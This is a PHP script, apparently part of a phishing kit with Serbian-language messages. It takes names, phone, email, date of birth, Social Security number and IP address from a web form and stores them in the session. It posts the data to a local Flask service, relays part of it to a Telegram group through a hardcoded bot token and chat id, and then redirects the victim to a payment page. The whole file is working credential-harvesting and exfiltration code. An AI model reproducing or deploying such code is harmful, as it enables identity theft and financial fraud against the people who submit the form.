<?php
session_start();

if (isset($_POST['submit'])) {
    $firstName = $_POST['first_name'] ?? '';
    $lastName = $_POST['last_name'] ?? '';
    $phone = $_POST['phone'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $ssn = $_POST['ssn'] ?? '';  
    $ipAddress = $_POST['ip_address'] ?? ''; 

    sacuvajPodatkeUSesiju('first_name', $firstName);
    sacuvajPodatkeUSesiju('last_name', $lastName);
    sacuvajPodatkeUSesiju('phone', $phone);
    sacuvajPodatkeUSesiju('email', $email);
    sacuvajPodatkeUSesiju('dob', $dob);
    sacuvajPodatkeUSesiju('ssn', $ssn);
    sacuvajPodatkeUSesiju('ip_address', $ipAddress);

    $flaskUrl = "http://127.0.0.1:5000/receive_data";

    $formData = http_build_query([
        'first_name' => $firstName,
        'last_name' => $lastName,
        'phone' => $phone,
        'email' => $email,
        'dob' => $dob,
        'ssn' => $ssn,
        'ip_address' => $ipAddress,
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ]);

    $chFlask = curl_init($flaskUrl);
    curl_setopt($chFlask, CURLOPT_POST, true);
    curl_setopt($chFlask, CURLOPT_POSTFIELDS, $formData);
    curl_setopt($chFlask, CURLOPT_RETURNTRANSFER, true);
    $flaskResponse = curl_exec($chFlask);
    curl_close($chFlask);

    if ($flaskResponse === false) {
        echo "Greška pri slanju podataka Flask aplikaciji: " . curl_error($chFlask);
    } else {
        echo "Podaci su uspešno poslati Flask aplikaciji: " . $flaskResponse;
        $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
        $chatId = '-4104959417';
        $telegramMessage = "Podaci: \nIme: $firstName\nPrezime: $lastName\nEmail: $email\nTelefon: $phone";

        $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
        $telegramData = [
            'chat_id' => $chatId,
            'text' => $telegramMessage,
        ];
        $chTelegram = curl_init($telegramUrl);
        curl_setopt($chTelegram, CURLOPT_POST, true);
        curl_setopt($chTelegram, CURLOPT_POSTFIELDS, http_build_query($telegramData));
        curl_setopt($chTelegram, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chTelegram, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
        $telegramResponse = curl_exec($chTelegram);
        curl_close($chTelegram);

        if ($telegramResponse === false) {
            echo "Greška pri slanju poruke na Telegram grupu: " . curl_error($chTelegram);
        } else {
            echo "Poruka je uspešno poslata na Telegram grupu: " . $telegramResponse;
            header("Location: payment.php");
            exit();
        }
    }
}

function sacuvajPodatkeUSesiju($imePolja, $vrednost) {
    if (!isset($_SESSION['podaci'])) {
        $_SESSION['podaci'] = array();
    }
    $_SESSION['podaci'][$imePolja] = $vrednost;
}
?>
